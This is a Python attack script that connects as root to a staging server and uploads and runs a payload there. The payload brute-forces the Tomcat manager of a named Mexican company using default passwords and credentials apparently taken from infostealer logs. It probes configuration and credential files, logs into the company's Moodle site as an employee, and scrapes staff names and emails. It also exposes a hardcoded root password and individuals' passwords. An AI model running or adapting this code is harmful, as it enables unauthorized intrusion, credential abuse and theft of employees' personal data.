import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, time, base64
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


# ========================================
# 1. TOMCAT MANAGER BRUTE (core.findep.mx:8080)
# ========================================
sys.stdout.write("=" * 60 + "\n=== TOMCAT MANAGER BRUTE — core.findep.mx:8080 ===\n" + "=" * 60 + "\n\n")

CORE8080 = "http://core.findep.mx:8080"

# Extended Tomcat default creds + FINDEP-specific patterns
tomcat_creds = [
    # Defaults
    ("tomcat", "tomcat"), ("admin", "admin"), ("manager", "manager"),
    ("tomcat", "s3cret"), ("admin", ""), ("tomcat", ""),
    ("admin", "tomcat"), ("admin", "password"), ("admin", "admin123"),
    ("tomcat", "manager"), ("manager", "tomcat"), ("manager", "manager1"),
    ("admin", "manager"), ("root", "root"), ("root", "toor"),
    ("admin", "changethis"), ("tomcat", "changethis"),
    ("role1", "role1"), ("both", "tomcat"), ("QCC", "QLogic66"),
    ("j2deployer", "j2deployer"), ("ovwebusr", "OvW*busr1"),
    ("cxsdk", "kdsxc"), ("ADMIN", "ADMIN"), ("xampp", "xampp"),
    # FINDEP patterns
    ("findep", "findep"), ("findep", "Findep2024"), ("findep", "Findep2025"),
    ("findep", "Findep2026"), ("admin", "Findep2024"), ("admin", "Findep2025"),
    ("admin", "Findep2026"), ("deployer", "deployer"), ("deploy", "deploy"),
    ("core", "core"), ("core", "findep"), ("admin", "P@ssw0rd"),
    ("admin", "Welcome1"), ("weblogic", "weblogic1"), ("weblogic", "welcome1"),
    ("administrator", "administrator"), ("admin", "admin1234"),
    # Stealer patterns
    ("bmendezar", "Pao1234+"), ("aguzmango", "Capacita-1"),
    ("admin", "Pao1234+"), ("admin", "Capacita-1"),
    ("jcruzval", "C#mbi@01"), ("admin", "C#mbi@01"),
]

manager_paths = ["/manager/html", "/manager/status", "/host-manager/html"]

for path in manager_paths:
    sys.stdout.write(f"\n--- Testing {path} ---\n")
    for user, pwd in tomcat_creds:
        try:
            r = requests.get(f"{CORE8080}{path}",
                auth=(user, pwd),
                headers={"User-Agent": UA},
                timeout=5, verify=False)
            
            if r.status_code == 200:
                sys.stdout.write(f"  *** SUCCESS *** [{r.status_code}] {user}:{pwd} -> {path}\n")
                sys.stdout.write(f"  Preview: {r.text[:500]}\n\n")
                break
            elif r.status_code == 403:
                sys.stdout.write(f"  [403] {user}:{pwd} (valid but no role?)\n")
            elif r.status_code != 401:
                sys.stdout.write(f"  [{r.status_code}] {user}:{pwd}\n")
        except Exception as e:
            sys.stdout.write(f"  ERR {user}:{pwd} -> {str(e)[:60]}\n")
            break
        sys.stdout.flush()


# Tomcat examples and other paths
sys.stdout.write("\n\n--- Other Tomcat paths ---\n")
tomcat_paths = [
    "/", "/index.jsp", "/examples/", "/examples/servlets/",
    "/examples/jsp/", "/examples/websocket/",
    "/docs/", "/docs/config/", "/docs/api/",
    "/status", "/server-status",
    "/host-manager/", "/WEB-INF/web.xml",
    "/META-INF/context.xml",
    "/.env", "/conf/server.xml", "/conf/tomcat-users.xml",
    "/manager/text/list", "/manager/jmxproxy",
    "/jolokia/", "/actuator/", "/actuator/env", "/actuator/health",
    "/probe/", "/psi-probe/",
    # CORE app paths
    "/BuzonDigital/", "/valida.do", "/loginUsuario.jsp",
    "/cambiaPassword.do", "/principal.do",
    "/administracion/", "/reportes/", "/configuracion/",
    "/api/", "/rest/", "/ws/", "/services/",
    "/swagger-ui.html", "/swagger-ui/", "/api-docs",
]

for path in tomcat_paths:
    try:
        r = requests.get(f"{CORE8080}{path}", headers={"User-Agent": UA},
            timeout=5, verify=False, allow_redirects=False)
        if r.status_code in [200, 302, 301]:
            tag = ""
            if r.status_code in [302, 301]:
                tag = f" -> {r.headers.get('Location', '')[:80]}"
            else:
                title = re.search(r'<title>(.*?)</title>', r.text[:2000], re.I)
                tag = f" [{title.group(1)[:50]}]" if title else f" ({len(r.text)}b)"
            sys.stdout.write(f"  [{r.status_code}] {path}{tag}\n")
        elif r.status_code == 403:
            sys.stdout.write(f"  [403] {path}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 2. MOODLE DEEP — LOGIN + MINE
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== MOODLE — LOGIN + DATA MINING ===\n" + "=" * 60 + "\n\n")

ms = requests.Session()
ms.verify = False
ms.headers.update({"User-Agent": UA})

MOODLE = "https://universidad.findep.mx"

# Get login page + extract logintoken
r_login = ms.get(f"{MOODLE}/login/index.php", timeout=10)
logintoken = re.search(r'name="logintoken"\s+value="([^"]+)"', r_login.text)
sys.stdout.write(f"Login page: [{r_login.status_code}], logintoken={logintoken.group(1)[:20]}...\n" if logintoken else f"Login page: [{r_login.status_code}], NO logintoken\n")

# Login
login_data = {
    "username": "aguzmango",
    "password": "Capacita-1",
    "logintoken": logintoken.group(1) if logintoken else "",
    "anchor": "",
}
r_auth = ms.post(f"{MOODLE}/login/index.php", data=login_data, timeout=10, allow_redirects=True)
sys.stdout.write(f"Login POST: [{r_auth.status_code}] ({len(r_auth.text)}b)\n")

# Check if logged in
logged_in = "aguzmango" in r_auth.text or "GUZMAN" in r_auth.text.upper() or "loggedinas" in r_auth.text.lower()
sys.stdout.write(f"Logged in: {logged_in}\n\n")

if logged_in:
    # 2a. Get user profile and enrolled users
    sys.stdout.write("--- User profile ---\n")
    r_profile = ms.get(f"{MOODLE}/user/profile.php", timeout=10)
    # Extract user details
    emails = re.findall(r'[\w.-]+@[\w.-]+\.(?:mx|com|com\.mx)', r_profile.text)
    names = re.findall(r'class="fullname"[^>]*>([^<]+)', r_profile.text)
    sys.stdout.write(f"Emails found: {set(emails)}\n")
    sys.stdout.write(f"Names: {names}\n\n")

    # 2b. Course 1298 — Control Interno y Riesgo Operativo
    sys.stdout.write("--- Course 1298: Control Interno y Riesgo Operativo ---\n")
    r_course = ms.get(f"{MOODLE}/course/view.php?id=1298", timeout=10)
    title = re.search(r'<title>(.*?)</title>', r_course.text[:3000], re.I)
    sys.stdout.write(f"[{r_course.status_code}] {title.group(1)[:80] if title else 'N/A'}\n")
    
    # Extract activities/resources
    activities = re.findall(r'class="instancename"[^>]*>([^<]+)', r_course.text)
    sys.stdout.write(f"Activities: {activities[:20]}\n")
    
    # Extract embedded URLs
    course_urls = re.findall(r'href="([^"]*(?:mod|resource|pluginfile)[^"]*)"', r_course.text)
    sys.stdout.write(f"Resources: {course_urls[:15]}\n\n")

    # 2c. Enrolled users / participants
    sys.stdout.write("--- Participants listing ---\n")
    for cid in [1298, 1143, 603]:
        r_part = ms.get(f"{MOODLE}/user/index.php?id={cid}&perpage=100", timeout=10)
        user_emails = re.findall(r'[\w.-]+@findep\.(?:com\.mx|mx|global|dev)', r_part.text)
        user_names = re.findall(r'class="fullname"[^>]*>([^<]+)', r_part.text)
        # Also try table rows
        rows = re.findall(r'<td[^>]*class="cell[^"]*"[^>]*>(.*?)</td>', r_part.text, re.S)
        sys.stdout.write(f"Course {cid}: {len(user_emails)} emails, {len(user_names)} names\n")
        if user_emails:
            sys.stdout.write(f"  Emails: {list(set(user_emails))[:20]}\n")
        if user_names:
            sys.stdout.write(f"  Names: {user_names[:15]}\n")
        sys.stdout.flush()

    # 2d. Web services check (admin APIs)
    sys.stdout.write("\n--- Moodle Web Services ---\n")
    ws_paths = [
        "/webservice/rest/server.php?wstoken=test&wsfunction=core_webservice_get_site_info&moodlewsrestformat=json",
        "/webservice/rest/server.php?wstoken=test&wsfunction=core_user_get_users&moodlewsrestformat=json&criteria[0][key]=email&criteria[0][value]=%25findep%25",
        "/admin/settings.php",
        "/admin/user.php",
        "/lib/ajax/service.php?sesskey=test&info=core_course_get_courses",
        "/report/",
    ]
    for path in ws_paths:
        try:
            r = ms.get(f"{MOODLE}{path}", timeout=5)
            sys.stdout.write(f"  [{r.status_code}] {path[:70]} ({len(r.text)}b)\n")
            if r.status_code == 200 and len(r.text) < 500:
                sys.stdout.write(f"    {r.text[:300]}\n")
        except:
            pass
        sys.stdout.flush()

    # 2e. Get sesskey for AJAX calls
    sesskey = re.search(r'"sesskey":"([^"]+)"', r_auth.text)
    if sesskey:
        sys.stdout.write(f"\nSesskey: {sesskey.group(1)}\n")
        
        # Try AJAX service calls
        ajax_calls = [
            {"index": 0, "methodname": "core_course_get_enrolled_courses_by_timeline_classification",
             "args": {"classification": "all", "limit": 100, "offset": 0}},
        ]
        for call in ajax_calls:
            try:
                r_ajax = ms.post(f"{MOODLE}/lib/ajax/service.php?sesskey={sesskey.group(1)}&info={call['methodname']}",
                    json=[call], timeout=10)
                data = r_ajax.json()
                if isinstance(data, list) and data:
                    if "data" in str(data[0]):
                        courses = data[0].get("data", {}).get("courses", [])
                        sys.stdout.write(f"\nAll enrolled courses ({len(courses)}):\n")
                        for c in courses[:30]:
                            sys.stdout.write(f"  [{c.get('id')}] {c.get('fullname', 'N/A')[:70]}\n")
            except Exception as e:
                sys.stdout.write(f"  AJAX err: {e}\n")
            sys.stdout.flush()


# ========================================
# 3. INTERNAL IP PROBE (35.192.238.30)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== INTERNAL IP PROBE (35.192.238.30) ===\n" + "=" * 60 + "\n\n")

for proto in ["http", "https"]:
    for port in [8080, 80, 443]:
        url = f"{proto}://35.192.238.30:{port}"
        try:
            r = requests.get(f"{url}/", headers={"User-Agent": UA, "Host": "core.findep.mx"},
                timeout=5, verify=False)
            sys.stdout.write(f"  [{r.status_code}] {url}/ (Host: core.findep.mx) ({len(r.text)}b)\n")
        except Exception as e:
            sys.stdout.write(f"  FAIL {url}/ -> {str(e)[:60]}\n")
        
        try:
            r = requests.get(f"{url}/BuzonDigital/", headers={"User-Agent": UA},
                timeout=5, verify=False)
            sys.stdout.write(f"  [{r.status_code}] {url}/BuzonDigital/ ({len(r.text)}b)\n")
        except Exception as e:
            sys.stdout.write(f"  FAIL {url}/BuzonDigital/ -> {str(e)[:60]}\n")
        sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_tomcat_moodle.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_tomcat_moodle.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
